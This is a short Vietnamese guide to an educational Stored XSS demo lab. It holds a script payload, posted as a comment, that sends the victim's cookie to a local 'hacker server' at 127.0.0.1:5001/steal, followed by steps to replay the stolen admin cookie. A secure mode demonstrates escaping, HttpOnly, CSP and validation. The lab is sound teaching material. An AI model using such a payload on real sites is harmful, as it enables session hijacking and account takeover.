Hướng dẫn Demo Stored XSS

Trang này dùng cho mục đích giáo dục về lỗ hổng Stored XSS (Cross-Site Scripting).

  1. Mở hacker server ở http://127.0.0.1:5001.
  2. Đăng nhập người dùng thường hoặc đăng ký người dùng mới.
  3. Gửi payload vào ô bình luận:
<script>
new Image().src='http://127.0.0.1:5001/steal?cookie='+encodeURIComponent(document.cookie);
</script>
  1. Mở trình duyệt/tab khác, đăng nhập bằng tài khoản admin.
  2. Admin vào Bảng điều khiển và mở Quản lý bình luận để xem bình luận được gửi.
  3. Kiểm tra hacker server hoặc file hacker_cookies.txt để thấy cookie bị ghi lại.
  4. Gắn cookie đó vào trình duyệt khác để mô phỏng chiếm session admin.
  5. Chạy secure mode để xem cách phòng chống.
🔒 Chạy secure mode

Dùng lệnh:

python app.py --secure

Secure mode kích hoạt output escaping + HttpOnly + CSP + input validation.
